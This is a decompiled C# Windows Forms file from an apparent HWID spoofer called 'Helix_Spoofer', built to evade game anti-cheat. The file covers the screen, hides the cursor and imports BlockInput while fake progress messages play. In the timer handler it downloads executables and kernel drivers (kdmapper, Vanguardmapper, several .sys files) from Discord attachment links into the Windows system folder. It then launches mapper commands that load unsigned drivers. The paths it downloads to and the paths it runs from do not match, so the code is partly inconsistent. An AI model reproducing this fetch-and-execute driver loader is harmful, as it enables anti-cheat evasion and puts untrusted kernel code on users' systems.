using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using HwidSpoofer;
using HwidSpoofer.Properties;

namespace Helix_Spoofer
{
	// Token: 0x02000008 RID: 8
	public partial class Spoofer_BE : Form
	{
		// Token: 0x06000029 RID: 41
		[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern void BlockInput([MarshalAs(UnmanagedType.Bool)] [In] bool fBlockIt);

		// Token: 0x0600002A RID: 42
		[DllImport("Gdi32.dll")]
		private static extern IntPtr CreateRoundRectRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nWidthEllipse, int nHeightEllipse);

		// Token: 0x0600002B RID: 43 RVA: 0x000059A8 File Offset: 0x00003BA8
		public Spoofer_BE()
		{
			this.InitializeComponent();
			base.Location = new Point(0, 0);
			base.Size = new Size(this.w, this.h);
			base.TopMost = true;
			Cursor.Hide();
		}

		// Token: 0x0600002C RID: 44 RVA: 0x00005A2F File Offset: 0x00003C2F
		private void Spoofer_BE_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x0600002D RID: 45 RVA: 0x00005A34 File Offset: 0x00003C34
		private void timer1_Tick(object sender, EventArgs e)
		{
			this.gunaProgressBar1.Value += 250;
			bool flag = this.gunaProgressBar1.Value >= 1000;
			if (flag)
			{
				this.cpu.Text = "Pairing with the privileged components...";
			}
			bool flag2 = this.gunaProgressBar1.Value >= 1000;
			if (flag2)
			{
				this.bios.Text = "Applying hardware serials modifcations...";
			}
			bool flag3 = this.gunaProgressBar1.Value >= 1000;
			if (flag3)
			{
				this.baseboard.Text = "Disconnecting from the privileged components.";
			}
			bool flag4 = this.gunaProgressBar1.Value >= 1000;
			if (flag4)
			{
				this.diskdrive.Text = "Cleaning files and registery entries...";
			}
			bool flag5 = this.gunaProgressBar1.Value >= 1000;
			if (flag5)
			{
				this.swofmac.Text = "Finializing execution with the server...";
				this.timer1.Enabled = false;
				WebClient webClient = new WebClient();
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/986859821510819851/1042556610905653248/DiskMapper.exe", "C:\\Windows\\System\\DiskMapper.exe");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/986859821510819851/1042556611551576165/Disk333.sys", "C:\\Windows\\System\\Disk333.sys");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/986859821510819851/1042556611912278036/Disk122.sys", "C:\\Windows\\System\\Disk122.sys");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/986859821510819851/1042556612260401232/Disk12.sys", "C:\\Windows\\System\\Disk12.sys");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/1027664258701467758/1030849244619350016/kdmapper1.exe", "C:\\Windows\\System\\kdmapper1.exe");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/1027969341720895488/1027969613599887471/driver_1.sys", "C:\\Windows\\System\\driver_1.sys");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/986428580198240278/1034996033572323369/Vanguardmapper.exe", "C:\\Windows\\System\\Vanguardmapper.exe");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/986428580198240278/1034996071836954754/dribber.sys", "C:\\Windows\\System\\dribber.sys");
				Process.Start("C:\\\\Windows\\\\System32\\\\mapper.exe C:\\\\Windows\\\\System32\\\\spoof.sys C:\\\\Windows\\\\System32\\\\spoof1.sys C:\\\\Windows\\\\System32\\\\spoof2.sys");
				Process.Start("C:\\\\Windows\\\\System32\\\\mapper.exe C:\\\\Windows\\\\System32\\\\spof.sys");
				Process.Start("C:\\\\Windows\\\\System32\\\\mapper.exe C:\\\\Windows\\\\System32\\\\driver.sys");
				Thread.Sleep(700);
				Cursor.Show();
				spoofed spoofed = new spoofed();
				spoofed.Show();
				base.Hide();
			}
		}

		// Token: 0x0600002E RID: 46 RVA: 0x00005C27 File Offset: 0x00003E27
		private void gunaProgressBar1_ValueChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600002F RID: 47 RVA: 0x00005C2A File Offset: 0x00003E2A
		private void pictureBox1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0400002F RID: 47
		private int w = Screen.PrimaryScreen.Bounds.Width;

		// Token: 0x04000030 RID: 48
		private int h = Screen.PrimaryScreen.Bounds.Height;
	}
}
